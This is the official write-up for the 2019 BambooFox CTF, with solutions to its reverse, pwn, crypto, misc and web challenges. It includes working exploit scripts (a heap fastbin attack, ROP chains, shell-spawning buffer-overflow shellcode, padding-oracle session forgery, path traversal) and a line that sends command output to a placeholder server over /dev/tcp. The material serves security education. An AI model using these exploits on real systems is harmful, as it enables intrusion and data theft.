---
slug: 2019-bamboofox-ctf-official-write-up
title: 2019 BambooFox CTF Official Write Up
description: 2019 BambooFox CTF Official Write Up 解題紀錄，整理題目分析、漏洞成因、利用方式與解題流程。
pubDate: "2020-01-07"
authors:
  - djosix
  - oalieno
  - zeze
  - lys0829
  - billy
  - seadog007
  - frozenkp
  - ss8650twtw
category: Write-up
tags:
  - pwn
  - crypto
  - web
  - misc
  - reverse
featured: false
coverTone: night
language: en
legacy: true
legacySource: https://github.com/bamboofox/bamboofox-blog-old/blob/master/_posts/2020-01-07-2019-bamboofox-ctf-official-write-up.md
legacyPath: "/write-ups/2020/01/07/2019-bamboofox-ctf-official-write-up.html"
---

## Reverse

### How2decompyle

- Author: zeze

1. see the info of the file downloaded from server
   ```shell
   > file decompyle
   decompyle.pyc: python 2.7 byte-compiled
   > mv decompyle decompyle.pyc
   > uncompyle6 decompyle.pyc
   ```
2. use uncompyle6 to get the source code

   ```python
   # uncompyle6 version 3.4.0
   # Python bytecode 2.7 (62211)
   # Decompiled from: Python 3.6.7 (default, Oct 22 2018, 11:32:17)
   # [GCC 8.2.0]
   # Embedded file name: decompyle.py
   # Compiled at: 2019-09-22 20:18:03
   import string
   restrictions = [
    'uudcjkllpuqngqwbujnbhobowpx_kdkp_',
    'f_negcqevyxmauuhthijbwhpjbvalnhnm',
    'dsafqqwxaqtstghrfbxzp_x_xo_kzqxck',
    'mdmqs_tfxbwisprcjutkrsogarmijtcls',
    'kvpsbdddqcyuzrgdomvnmlaymnlbegnur',
    'oykgmfa_cmroybxsgwktlzfitgagwxawu',
    'ewxbxogihhmknjcpbymdxqljvsspnvzfv',
    'izjwevjzooutelioqrbggatwkqfcuzwin',
    'xtbifb_vzsilvyjmyqsxdkrrqwyyiu_vb',
    'watartiplxa_ktzn_ouwzndcrfutffyzd',
    'rqzhdgfhdnbpmomakleqfpmxetpwpobgj',
    'qggdzxprwisr_vkkipgftuvhsizlc_pbz',
    'jerzhlnsegcaqzathfpuufwunakdtceqw',
    'lbvlyyrugffgrwo_v_zrqvqszchqrrljq',
    'aiwuuhzbszvfpidwwkl_wynlujbsbhfox',
    'vmhrizxtiegxdxsqcdoiyxkffloudwtxg',
    'tffjnabob_jbf_qiszdsemczghnjysmah',
    'zrqkppvynlkelnevngwlkhgaputhoagtt',
    'nl_oojyafwoqccbedijmigpedkdzglq_f',
    'cksy_skctjlyxktuzchvstunyvcvabomc',
    'ppcxleeguvhvhengmvac_bykhzqohjuei',
    '_clmaicjrrzhwd_fescyaejtbyefxyihy',
    'hhopvwsmjtpjiffzatyhjrev_dwnsidyo',
    'sjevtrmkkk_zjalxrxfovjsbcxjx_pskp',
    'gnynwuuqypddbsylparpcczqimimqmvdl',
    'bxitcmhnmanwuhvjxnqeoiimlegrmkjra']
   capital = [
    0, 4, 9, 19, 23, 26]
   flag = raw_input('Please tell me something : ').lower()
   flag = flag.lower()
   if len(flag) != len(restrictions[0]):
   		print 'No......You are wrong orzzzzz'
   		exit(0)
   for f in range(len(flag)):
   		for r in restrictions:
   				if flag[f] not in string.lowercase + '_' or flag[f] == r[f]:
   						print 'No......You are wrong orzzzzzzzzzzzz'
   						exit(0)

   cap_flag = ''
   for f in range(len(flag)):
   		if f in capital:
   				cap_flag += flag[f].upper()
   		else:
   				cap_flag += flag[f]

   print 'Yeah, you got it !\nBambooFox{' + cap_flag + '}\n'
   # okay decompiling decompyle.pyc
   ```

3. start reverse After reading the script, we will know that there are 26 strings in a list named restrictions, and we should input the flag then it outputs either `No......You are wrong orzzzzz` or `Yeah, you got it !\nBambooFox{XXX}`.

There are two ways in the script to check whether your flag is correct.

First, it compares the length of your flag and restriction[0], namely, 33.

Second, if the ith char in your flag is not in `[a-z_]` or it is included in the ith char of the 26 strings in restriction, it will output `No......You are wrong orzzzzzzzzzzzz`.

- ex. Look at the first column. There is a `_` in the column, and the others are lowercase alphabet, so there must miss an alphabet that the column does not include, then the missing alphabet `y` is the first char of the flag.

```text
uudcjkllpuqngqwbujnbhobowpx_kdkp_
f_negcqevyxmauuhthijbwhpjbvalnhnm
dsafqqwxaqtstghrfbxzp_x_xo_kzqxck
mdmqs_tfxbwisprcjutkrsogarmijtcls
kvpsbdddqcyuzrgdomvnmlaymnlbegnur
oykgmfa_cmroybxsgwktlzfitgagwxawu
ewxbxogihhmknjcpbymdxqljvsspnvzfv
izjwevjzooutelioqrbggatwkqfcuzwin
xtbifb_vzsilvyjmyqsxdkrrqwyyiu_vb
watartiplxa_ktzn_ouwzndcrfutffyzd
rqzhdgfhdnbpmomakleqfpmxetpwpobgj
qggdzxprwisr_vkkipgftuvhsizlc_pbz
jerzhlnsegcaqzathfpuufwunakdtceqw
lbvlyyrugffgrwo_v_zrqvqszchqrrljq
aiwuuhzbszvfpidwwkl_wynlujbsbhfox
vmhrizxtiegxdxsqcdoiyxkffloudwtxg
tffjnabob_jbf_qiszdsemczghnjysmah
zrqkppvynlkelnevngwlkhgaputhoagtt
nl_oojyafwoqccbedijmigpedkdzglq_f
cksy_skctjlyxktuzchvstunyvcvabomc
ppcxleeguvhvhengmvac_bykhzqohjuei
_clmaicjrrzhwd_fescyaejtbyefxyihy
hhopvwsmjtpjiffzatyhjrev_dwnsidyo
sjevtrmkkk_zjalxrxfovjsbcxjx_pskp
gnynwuuqypddbsylparpcczqimimqmvdl
bxitcmhnmanwuhvjxnqeoiimlegrmkjra
```

Then see the 33 columns, you will get the flag.

### Move or not

- Author: zeze

1. Pass the first password check 98416
2. Second one is to input the key. Just try from 0 to 256 to see which one does not abort with error.
   ```python
   # coding=utf-8
   from pwn import *

   results = []

   for i in range(256):
   		r = remote('127.0.0.1', 30003)
   		r.recvuntil('First give me your password:')
   		r.sendline('98416')
   		r.sendlineafter('Second give me your key: ', str(i))
   		res = r.recvall(1)
   		if 'Then Verify your flag: ' in res:
   				print i
   				results.append(i)

   print results
   ```

There should be 7 possibilities `[39, 43, 48, 50, 114, 117, 206]`.

3. The third one is to verify the flag. It uses strcmp to compare our flag with its. Use gdb to test 7 possibilities one by one, then we will find out that when the key = 50, the flag is correct.

### Emoji encoder

## Pwn

### Land-2

The score you can get is decide by the `_count` variable. So the goal in this challenge is to control `_count`. Use `area()` we can increase the global variable `_count`. We can increase `_count` to a number we know, then search the number in Bss section to find the location of `_count`. After we found the location of `_count`, we can do arbitrary write on it. We can call `area()` to find the answer. Set `_count` to zero before return the answer. The following code shows how to find the `_count`'s address.

```c
int aaa[1];
rectangle find_rectangle(){
    rectangle answer;
    for(int i=0;i<76;i++)area(0,0,1,1);
    int c = -2000;
    for(;c<=0;c++){
        if(aaa[c]==76)break;
    }
    aaa[c] = 0; //aaa[c] == _count
}
```

### note

The return value of snprintf is the size of characters printed, instead of the size written to the final string.

It will cause heap overflow vulnerability at `copy`. Leaking libc base address, and do fastbin attack to overwrite `__malloc_hook` to `one_gadget`.

The `idx` and `size` value should be 0 to satisfy one_gadget limitation.

```python
from pwn import *
import sys
if len(sys.argv) >1:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('./note')

def create(size):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(size))

def edit(idx, ctx):
    r.sendlineafter(':', '2')
    r.sendlineafter(':', str(idx))
    r.sendafter(':', ctx)

def show(idx):
    r.sendlineafter(':', '3')
    r.sendlineafter(':', str(idx))

def copy(src,dst):
    r.sendlineafter(':', '4')
    r.sendlineafter(':', str(src))
    r.sendlineafter(':', str(dst))

def delete(idx):
    r.sendlineafter(':', '5')
    r.sendlineafter(':', str(idx))

for i in range(7):
    create(0x60)
    delete(0)

for i in range(7):
    create(0x400)
    delete(0)

create(0x80)
create(0x400)
create(0x80)
create(0x400)
create(0x80)
create(0x60)
create(0x60)
create(0x80)
delete(1)

edit(3, 'A'*0x100 + '\n')
copy(3, 0)
show(0)

r.recvn(0x91)
libc = u64(r.recvn(8)) - 0x3ebca0
print('libc', hex(libc))

delete(6)
delete(5)

copy(3, 4)
edit(3, 'A'*0x90 + p64(libc+0x3ebc30-0x28+5))
copy(3, 4)

for i in range(6,-1, -1):
    edit(3, 'A'*(0x88+i) + p64(0x71) )
    copy(3, 4)
create(0x60)
create(0x60)

one_gadget = libc+0x4f322
edit(5, 'A'*0x13 + p64(one_gadget))
delete(0)
create(0)

r.interactive()
```

### ABW

```python
from pwn import *
context.arch = "amd64"

r  = remote("34.82.101.212", 10010)

r.sendlineafter(":","/proc/self/mem")
r.sendlineafter(":",str(0x4b0f40))
payload = asm("""
push rax
pop rdi
push rsp
pop rsi
push 0x60
pop rdx
syscall
ret
""")
print len(payload)
r.sendlineafter(":",payload.encode("hex"))
r.send(p64(0x0000000000421872)+p64(0x4112af)+p64(0x41f4e0))
r.interactive()
```

### APP

```python
from pwn import *
context.arch = "amd64"
#r = process('./run.sh')
r  = remote("34.82.101.212", 10011)
#0x0000000000474a05: syscall; ret;
#0x000000000044b9d9: pop rdx; pop rsi; ret;
#0x0000000000415234: pop rax; ret;
#0x0000000000400686: pop rdi; ret;
#0x000000000043ff98: add al, 7; ret;
payload = "a"*0x108

payload += flat(
0x415234,3,0x43ff98,0x400686,0x006b6000,0x44b9d9,0x7,0x6000,0x474a05,
0x415234,0,0x400686,0,0x44b9d9,0x1000,0x006b6000,0x474a05,0x006b6000
)

r.sendline(payload)
r.send(asm(shellcraft.cat("flag1")+
shellcraft.pushstr("Joker")+
"""
mov rax,319
mov rdi,rsp
mov rsi,0
syscall
mov rbx,rax
mov rbp,rax"""+
shellcraft.pushstr("#!/read_flag\n")+
shellcraft.syscall('SYS_write','rbp','rsp',13)+
"""
push 0
mov rsi,rsp
xor rdx,rdx
xor r10,r10
mov r8,0x1000
mov rax,322
syscall
""" +
shellcraft.exit(0)
))
r.interactive()
```

## Crypto

### oracle

RSA LSB oracle

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import *

r = remote('34.82.101.212', 20001)

r.sendlineafter('> ', '1')
c = int(r.recvline()[4:])
n = int(r.recvline()[4:])
e = 65537

def oracle(x):
    r.sendlineafter('> ', '2')
    r.sendlineafter('c = ', str(x))
    m = int(r.recvline()[4:])
    return m

L, H, R = 0, 1, 1

s = 1
while True:
    s = s * pow(3, e, n) % n
    m = oracle(s * c % n)

    L, H, R = 3 * L, 3 * H, 3 * R

    if m == 0:
        H -= 2
    elif m == (-n % 3):
        L += 1
        H -= 1
    else:
        L += 2

    if (n * H // R) - (n * L // R) < 2:
        break

print(long_to_bytes(n * L // R))
print(long_to_bytes(n * H // R))

r.interactive()
```

### Oil Circuit Breaker

The attack follow this paper https://eprint.iacr.org/2019/311.pdf

To do universal forgery with only 2 encryption oracles and 1 decryption oracles. First use 1 encryption oracle and 1 decryption oracle to get a few of random mappings. Then, you can brute force the last byte of the block to get the ciphertext and tag with only 1 encryption oracle.

## Misc

### Tree

After some observation (`tree` command can help you), you can find it is a expression tree contains two operation. Every result is one ascii code in flag.

```python
from os import listdir, chdir

def solver(op):
    files = listdir(".")
    nums = []
    for f in files:
        type = f.split("_")[1]
        if type == "number":
            with open(f,"r") as fo:
                nums.append(int(fo.read()))
        else:
            chdir(f)
            nums.append(solver(type))
            chdir("..")
    if len(nums)==1:
        return nums[0]
    if op == "+":
        return nums[0]+nums[1]
    else:
        return nums[0]*nums[1]

#print(solver(""))

flag = ""
allf = listdir(".")
#print(allf)

for f in allf:
    chdir(f)
    flag += chr(solver(""))
    chdir("..")
print(flag)
```

### Land-WTF

First, read the grader code, and read `main` function carefully.

```c
int main() {
    init();
    int t,mx=0;
    rectangle tmp;
    _input(&t);
    while(t--){
        if(t%10==0)init();
        *_count=rand()%8787,*xddddd=1;
        _input(_a),_input(_b),_input(_c),_input(_d);
        fillVM();
        tmp=find_rectangle();
        if(tmp.a!=*_a||tmp.b!=*_b||tmp.c!=*_c||tmp.d!=*_d)
            _wrong_answer("incorrect place");
        else
            mx=_max(mx,*_count);
    }
    _Accepted(mx);
}
```

We can found two things. First, the variable `mx` initial value is 0. Second, if input `t` is 0, then the main function will call `_Accepted` directly. So, if we can let input `t` = 0, then we can get Accepted and use 0 times query. We can call `main()` recursively. Because it is possible have some 0 in testdata, it is possible to let `t` = 0.

```c
#include "Land.h"

int main();

rectangle find_rectangle(){
    main();
}
```

### AlphaGO

- Author: zeze

1. We get a picture like this

![2019 BambooFox CTF Official Write Up 文章附圖](/blog/legacy-images/N3mXtrX.webp)

2. We can get the hint in the description: `e01ddf6594a4387bbf520e7d678578151b8824849cc02783c66e9da6c07f953e` Just use the sha256 decrypt tool on the internet to decrypt it, then we will get `1st`

3. We have two clues: (1)AlphaGo (2) 1st. We can google the game that AlphaGo plays.

4. The answer is [AlphaGo VS Lee sedol 1st round](https://www.101weiqi.com/chessbook/chess/139087/).

5. Then along the order of the position they put, we will finally get the flag after 63.

### Find the Cat

1. We get a cat.png like this ![2019 BambooFox CTF Official Write Up 文章附圖](/blog/legacy-images/8cuVsBU.webp)
2. `binwalk cat.png` we get that there're two png in this png file
   ```
   DECIMAL       HEXADECIMAL     DESCRIPTION
   --------------------------------------------------------------------------------
   0             0x0             PNG image, 739 x 554, 8-bit/color RGBA, non-interlaced
   101           0x65            Zlib compressed data, best compression
   371382        0x5AAB6         PNG image, 739 x 554, 8-bit/color RGBA, non-interlaced
   371483        0x5AB1B         Zlib compressed data, best compression
   ```
3. Seperate it into 2 images → cat.png, cat1.png
4. `compare cat.png cat1.png -compose src diff.png`, then we can see the output diff.png ![2019 BambooFox CTF Official Write Up 文章附圖](/blog/legacy-images/Reu95Ix.webp)
5. scan the qrcode get an url https://imgur.com/download/Xrv86y2 then get a image
6. `strings Xrv86y2.jpg | grep BAMBOOFOX{`
7. get the flag `BAMBOOFOX{Y0u_f1nd_th3_h1dd3n_c4t!!!}`

### I can't see you!

1. We get a zip file what.zip
2. When trying to extract the zip, we find that it needs password
3. Let's use a tool to find the password Ex. https://www.lostmypass.com/file-types/zip/
4. Then get the password "blind" and extract the zip file
5. get an image (which is a Braille)![2019 BambooFox CTF Official Write Up 文章附圖](/blog/legacy-images/ub6dbYB.webp)
6. Then mapping them to letters and get the flag `BAMBOOFOX{YA_YOU_KNOW_WHAT_BLIND_MEANS}`

## Web

### Web Newbie

#### Recon

Once access to the challenge, you will be redirected to `/myfirstweb/index.php?op=new`, where you can create a new post.

After creating a new post, it'll redirect you to `/myfirstweb/index.php?op=view&file=<FILE>` where <FILE> is the name of the file you created earlier.

By inspecting the HTML, you can see that there's actually four link on the navbar where the link to the hint page is commented out.

#### Solution

First, let's see what's the hint: Flag is in `../flag.txt`. You might try to access `/myfirstweb/index.php?op=view&file=../flag.txt`, unfortunately, it responds with an error telling you Found flag format in content, no flag for you!.

One might think of is to try to access the file with Local File Inclusion with `file=php://read=convert.base64-encode/resource=../flag.txt`. However, it gave you another error message: File not found!.

How about trying to get index.php by LFI? By doing so, you will still get the same error message: File not found!.

Since `index.php` is in a folder called myfirstweb, and the hint also told you the flag is in `../flag.txt`, why not try to access it directly with `/flag.txt`?

Once you access the flag file directly, TA-DA, there's the flag!

P.S. You might wonder why the error message returned by `php://` is File not found! instead of Found flag format in content, no flag for you!. That's because this challenge is written in Node.js, lol.

### Warmup

Code:

```php
<?php

    highlight_file(__FILE__);

    if ($x = @$_GET['x'])
        eval(substr($x, 0, 5));
```

Use PHP [execution operator](https://www.php.net/manual/en/language.operators.execution.php) to execute arbitrary command

```php
?x=`$x`;sleep 1
?x=`$x`;bash -c 'ls > /dev/tcp/your-server.com/12345'
```

And you will recieve:

```php
BAMBOOFOX{d22a508c497c1ba84fb3e8aab238a74e}
index.php
```

### HAPPY

1. There was a `/.git` directory exposed publicly, and you can get `/.git/HEAD`. If you use directory scanner, you would probably find `/Makefile` as well.
2. Source code is also under the document root, which can be viewed directly (`Makefile`, `log.asm`, `server.asm`, `http.asm`, `utils.asm`, `socket.asm`). It's a web server written in x86_64 assembly language.
3. In `http.asm`, to retrieve a file, it just prepend `"."` to the path provided in the HTTP request. For example: With
   ```shell
   GET /index.html HTTP/1.1
   ...
   ```
   it will read `./index.html` and send to you.
4. So you just request with a file path like `/../../../../../../../../home/web/flags/flag1.txt` and it will send you the flag:
   ```bash
   $ curl --path-as-is http://59.124.168.42:8001/../../../../../../../../home/web/flags/flag1.txt
   BAMBOOFOX{251d19bd7cb60e72a3825d898bffcee5}
   ```

### NEW

1. `server.out` is a friendly binary assembled with `nasm`:
   ```shell
   Arch:     amd64-64-little
   RELRO:    No RELRO
   Stack:    No canary found
   NX:       NX disabled
   PIE:      No PIE
   ```
2. There was a buffer overflow while reading the request path in `http.asm`:
   ```asm
   read_req_path:

       enter 1000, 0

   read_req_path_start:

       mov rax, 0          ; sys_read
       mov rdi, [sockfd]   ; read from client
       lea rsi, [rbp-1000]   ; store in req_path
       mov rdx, 1024       ; read only 1 line (<=1 KB)
       syscall
   ...
       leave
       ret
   ```
3. Pwn:
   ```python
   from pwn import *

   r = remote("59.124.168.42", 8001)
   e = ELF('./server.out')

   # bss
   bss = e.bss()
   req_path = bss + 144 + 256
   sockfd = bss + 144 + 256 + 128 + 8 + 8

   # shellcode
   s = f"""
       mov rsi, 2
       mov rdi, [{sockfd}]
   dup2:
       mov rax, 33
       syscall
       dec rsi
       jns dup2
   """ + shellcraft.amd64.sh()

   # payload
   p = b"GET /" + asm(s, arch='amd64')
   p += (1000 - len(p) + 8) * b'p'  # padding
   p += p64(req_path + 2) # return address

   r.sendline(p)
   r.interactive()
   ```
4. After getting the shell, there was only a `/bin/sh` for you, but you were able to list and read files using built-in commands and wildcard:
   ```bash
   $ ls
   sh: 1: ls: not found

   $ echo $PATH
   /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

   $ echo /usr/local/sbin/* /usr/local/bin/* /usr/sbin/* /usr/bin/* /sbin/* /bin/*
   /usr/local/sbin/* /usr/local/bin/* /usr/sbin/* /usr/bin/* /sbin/* /bin/sh

   $ pwd
   /home/web/server

   $ cd ../flags

   $ pwd
   /home/web/flags

   $ echo *
   flag1.txt flag2-99754106633f94d350db34d548d6091a.txt

   $ sh flag2-99754106633f94d350db34d548d6091a.txt
   flag2-99754106633f94d350db34d548d6091a.txt: 1: BAMBOOFOX{dfdacda187002cb07922c42389a1aa83}: not found
   ```

### YEAR

Our expected solution didn't work, sorry... But you can still write shellcode to make a HTTP request. There were some clues about the IP address of `neighbor` in `/etc/hosts`.

### Da Ji

1. Through several tests, you might find out that the session was encrypted using CBC mode with 16 bytes block size.
2. Use padding oracle to decrypt the session: [https://github.com/djosix/padding_oracle.py](https://github.com/djosix/padding_oracle.py)
   ```php
   a:2:{s:4:"show";b:0;s:4:"name";s:1:"a";}\x08\x08\x08\x08\x08\x08\x08\x08
   ```
   This is a serialized PHP array. It's clear that you need to modify `show` to 1.
3. You can modify your name to fake a serialized PHP array and try to align it to a block with correct padding.
   ```php
   [      IV      ]a:2:{s:4:"show";b:0;s:4:"name";s:59:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01";}
   |               |               |               |               |               |               |               |
   0               16              32              48              64              80              96              112             128
   ```
   So the name should be `___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01` (the last `\x01` is PKCS#7 padding). After sending this string as name, you will recieve the session.
4. Then you just remove 0-47 and 112- of the session. (48-63 will be treated as IV). The decrypted session would be:
   ```php
   a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01
   ```

Exploit

```python
import requests, sys

# https://github.com/djosix/padding_oracle.py
from padding_oracle import *


URL = 'http://34.82.101.212:8002/'

#=========================================================
# Padding oracle
#=========================================================

sess = requests.Session()
session = '%2Bfs7r4VO2kxNDdi0arbP7r6bqqf993hx739dOLzBYo5HKnKHZCTLjRBlCYlSTLEszQzRJldsd9Tfv04AUNsFtA%3D%3D'
cipher = base64_decode(urldecode(session))

def oracle(cipher):
    r = sess.get(URL, cookies={'session': urlencode(base64_encode(cipher))})
    return 'error' not in r.text

plaintext = padding_oracle(cipher, 16, oracle, 64)

print(remove_padding(plaintext).decode())
# b'a:2:{s:4:"show";b:0;s:4:"name";s:1:"a";}\x08\x08\x08\x08\x08\x08\x08\x08'

#=========================================================
# Modify session
#=========================================================

'''
                a:2:{s:4:"show";b:0;s:4:"name";s:3:"asd";}
[------IV------][----Block-----][----Block-----][----Block-----]
a:2:{s:4:"show";b:0;s:4:"name";s:?:"                                            ";}
                                    a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}
a:2:{s:4:"show";b:0;s:4:"name";s:44:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}
0               16              32              48              64              80              96              112             128

[------IV------][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----][----Block-----]
                                                [------IV------][----Block-----][----Block-----][----Block-----]
                a:2:{s:4:"show";b:0;s:4:"name";s:59:"___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}_";}
0               16              32              48              64              80              96              112             128

name=___________a%3A2%3A%7Bs%3A4%3A%22show%22%3Bs%3A1%3A%221%22%3Bs%3A4%3A%22name%22%3Bs%3A1%3A%22a%22%3B%7D%22%3B%7D%01

'''

name = '___________a:2:{s:4:"show";s:1:"1";s:4:"name";s:1:"a";}";}\x01'
cipher = base64_decode(urldecode(requests.post(URL, data={'name': name}).cookies.get('session')))
cipher = cipher[48:112]
print(requests.get(URL, cookies={'session': urlencode(base64_encode(cipher))}).text)
# <title>大吉</title><h1>Hello, a</h1>This is your flag: <b>BAMBOOFOX{78c75409bab501f3973ac6dc7e309b59}</b>
```

### Messy PHP

There are lots of Unicode characters in the parameter, careful After removed comments and useless code, the code is

```php
<?php

include_once('flag.php');

if ((isset($_POST['😂']) and isset($_POST['🤣']) and isset($_GET['KEY'])) or isset($_GET['is_this_flag？'])){
    srand(20191231 + 20200101 + time());
    $mystr = 'Happy New  Year⁠!~~~';
    $array1 = str_split($fllllllag, 1);
    $array2 = str_split($mystr, 1);
    $array3 = str_split($_GET['KEY'], 1);
    $final = '';
    foreach( $array1 as $value ){
        $final .= @strval(ord($value) ^ rand() ^ $array2[rand() % count($array2)] ^ ($array3[rand() % count($array3)] * random_int(1,128))) . ' ';
    }
    if ($_POST['​😂'] == md5($_POST['🤣​'])){
        echo $final;
    }else{
        die('bye!');
    }
}else{
    die('bye!');
}
```

The code finally did three xor for the each character of the flag. But since we can predict the rand() by passing the same rand seed, we can reverse the process of xor function. Also, the last xor is xor with the input `KEY`, we can just simply give \x00 to reduce it.

We already mention that it has lots of Unicode characters in it, and the raw packet will look like this

```shell
POST /index.php?KEY=%00 HTTP/1.1
Host: 34.82.101.212
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

%E2%80%8B%F0%9F%98%82=c4ca4238a0b923820dcc509a6f75849b&%F0%9F%A4%A3%E2%80%8B=1&%F0%9F%98%82=1&%F0%9F%A4%A3=1
```

We can use curl to send the request

```shell
curl 'http://server/index.php?KEY=%00' --data-raw '%E2%80%8B%F0%9F%98%82=c4ca4238a0b923820dcc509a6f75849b&%F0%9F%A4%A3%E2%80%8B=1&%F0%9F%98%82=1&%F0%9F%A4%A3=1'
```

Then the server will give a set of numbers

```
843435546 2075703868 2068761948 735888953 1414869565 995844919 2011787626 1249952864 1471672898 865484610 82905966 1406731009 1711850813 1980158610 962580498 1095680930 936808370 541273572 1621099101 2058080657 107465805 2091610395 948091109 1602905557 2004172843 1894517632 1221478033 2047568514 787119479 427616689 755108574 2004186216 2071261550 929755589 1249328075
```

since the server might have time different with your local computer, we can just try every possible random seed in last one minute. (And yes, it's enough to paste it by hand)

```php
<?php

$t=time();
$flag = explode(' ', '843435546 2075703868 2068761948 735888953 1414869565 995844919 2011787626 1249952864 1471672898 865484610 82905966 1406731009 1711850813 1980158610 962580498 1095680930 936808370 541273572 1621099101 2058080657 107465805 2091610395 948091109 1602905557 2004172843 1894517632 1221478033 2047568514 787119479 427616689 755108574 2004186216 2071261550 929755589 1249328075');

for ($j=-60; $j<=0; $j++){
    srand(20191231 + 20200101 + $t + $j);
    $mystr = 'Happy';
    $mystr .= ' New';
    $mystr .= '  Year⁠!~~~~~~';
    $array2 = str_split($mystr, 1);
    $final = '';
    for ($i=0; $i<=count($flag)-1; $i++){
        $final .= @chr($flag[$i] ^ rand() ^ $array2[rand() % count($array2)]);
        rand(); // There were three rand() in the original script
    }
    echo $final . "\n";
}
```

![2019 BambooFox CTF Official Write Up 文章附圖](/blog/legacy-images/Rm5qAA8.webp)

And also I forget to convert the array2 to int, which is unintended, so the second xor is not work at all :P.

`BAMBOOFOX{WHY_THERE_ARE_UNICODE_LA}`
